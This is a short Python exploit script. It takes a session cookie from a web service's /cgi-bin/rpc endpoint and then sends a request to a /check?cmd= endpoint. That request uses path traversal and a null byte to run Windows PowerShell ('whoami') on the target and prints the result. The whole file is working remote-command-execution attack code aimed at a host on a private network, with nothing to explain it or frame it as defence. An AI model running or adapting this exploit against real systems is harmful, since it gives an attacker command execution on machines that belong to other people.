import requests


class IP:
    ip = "192.168.2.196:49676"


def get_session():
    url = "http://" + IP.ip + "/cgi-bin/rpc"

    payload = "action=verify-haras"
    headers = {
        'Content-Type': 'text/plain'
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    Cookie = response.json()["verify_string"]

    return Cookie

    # print(response.json())
    # print(response.json()["verify_string"])


def rce():
    url = "http://" + IP.ip + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2F" \
                              "WindowsPowerShell%2Fv1.0%2Fpowershell.exe%20whoami%00"

    payload = {}
    # print(get_session())
    headers = {
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': 'CID=' + get_session(),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/98.0.4758.102 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,'
                  '*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
    }

    response = requests.request("GET", url, headers=headers, data=payload)

    # print(headers)

    print(response.text)


if __name__ == "__main__":
    get_session()
    rce()
